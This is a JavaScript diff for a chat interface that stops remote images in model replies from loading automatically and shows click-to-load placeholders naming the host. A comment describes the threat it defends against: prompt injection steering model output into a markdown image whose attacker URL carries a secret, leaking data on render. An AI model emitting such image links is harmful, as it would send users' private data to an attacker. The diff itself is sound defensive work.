@@ -301,12 +301,22 @@ function moreListPayloadFromHref(href) {
 // fabricate a URL) must never leave an empty gap, so each image is paired with
 // a hidden fallback caption (alt text + URL) that _bindChatImageFallback()
 // reveals when the load fails.
+//
+// Same-origin images (relative URLs included) load inline. A remote https
+// image is NOT fetched on render: model output can be steered by a prompt
+// injection into `![x](https://attacker/?d=<secret>)`, which would leak data
+// the moment the reply renders. It renders as a click-to-load placeholder
+// naming the host instead; _bindChatRemoteImageLoad() swaps in the image.
 function imageHtml(alt, url, title) {
   const rawUrl = String(url || '').trim();
   let safeUrl = '';
+  let remoteHost = '';
   try {
     const parsed = new URL(rawUrl, window.location.origin);
-    if (parsed.protocol === 'https:') safeUrl = parsed.href;
+    const sameOrigin = parsed.origin === window.location.origin
+      && (parsed.protocol === 'https:' || parsed.protocol === 'http:');
+    if (sameOrigin || parsed.protocol === 'https:') safeUrl = parsed.href;
+    if (!sameOrigin) remoteHost = parsed.host;
   } catch (_) {
     safeUrl = '';
   }
@@ -315,6 +325,21 @@ function imageHtml(alt, url, title) {
   const safeTitle = title ? ` title="${escapeHtml(title)}"` : '';
   const displayUrl = escapeHtml(safeUrl);
   const fallbackLabel = escapeHtml(alt || 'Image');
+  if (remoteHost) {
+    // Text inside this <a> must not trip the later autolink passes (a nested
+    // <a> would truncate this one when it is extracted as an allowed-HTML
+    // block), so the host's dots are entity-encoded.
+    const hostText = escapeHtml(remoteHost).replace(/\./g, '&#46;');
+    const titleData = title ? ` data-chat-image-title="${escapeHtml(title)}"` : '';
+    return (
+      `<a class="chat-image chat-image-remote" href="${displayUrl}" target="_blank" rel="noopener noreferrer"` +
+      ` data-chat-image-src="${displayUrl}" data-chat-image-alt="${safeAlt}"${titleData}` +
+      ` title="Remote image not loaded. Click to load it from ${hostText}">` +
+      `<span class="chat-image-remote-title">${fallbackLabel}</span>` +
+      `<span class="chat-image-remote-sub">Remote image blocked · ${hostText} · Click to load</span>` +
+      `</a>`
+    );
+  }
   // The fallback caption shows the URL as readable text, but a bare
   // `https://` in that text would be caught by the later bare-URL autolink
   // pass and wrapped in a nested <a> — which then truncates this outer <a>
@@ -347,7 +372,47 @@ function _bindChatImageFallback() {
     if (wrap) wrap.classList.remove('image-broken');
   }, true);
 }
+
+// Load a remote chat image only when the user clicks its placeholder. Runs in
+// the capture phase so the placeholder's href (kept so it still opens the
+// image without JS) never navigates and no other link handler sees the click.
+// After the swap the <a> is an ordinary .chat-image thumbnail again.
+function _bindChatRemoteImageLoad() {
+  if (typeof document === 'undefined' || !document.addEventListener) return;
+  document.addEventListener('click', (event) => {
+    const link = event?.target?.closest?.('a.chat-image-remote');
+    if (!link) return;
+    event.preventDefault();
+    event.stopImmediatePropagation();
+    let src = '';
+    try {
+      const parsed = new URL(link.dataset.chatImageSrc || '', window.location.origin);
+      if (parsed.protocol === 'https:') src = parsed.href;
+    } catch (_) {
+      src = '';
+    }
+    if (!src) return;
+    const alt = link.dataset.chatImageAlt || '';
+    const img = document.createElement('img');
+    img.className = 'chat-inline-image';
+    img.alt = alt;
+    if (link.dataset.chatImageTitle) img.title = link.dataset.chatImageTitle;
+    img.decoding = 'async';
+    img.referrerPolicy = 'no-referrer';
+    img.src = src;
+    const fallback = document.createElement('span');
+    fallback.className = 'chat-image-fallback';
+    fallback.textContent = `${alt || 'Image'} — ${src}`;
+    link.classList.remove('chat-image-remote');
+    link.removeAttribute('data-chat-image-src');
+    link.removeAttribute('data-chat-image-alt');
+    link.removeAttribute('data-chat-image-title');
+    link.title = 'Open image in a new tab';
+    link.replaceChildren(img, fallback);
+  }, true);
+}
 _bindChatImageFallback();
+_bindChatRemoteImageLoad();
 
 function _isModelEndpointUrl(rawUrl) {
   try {
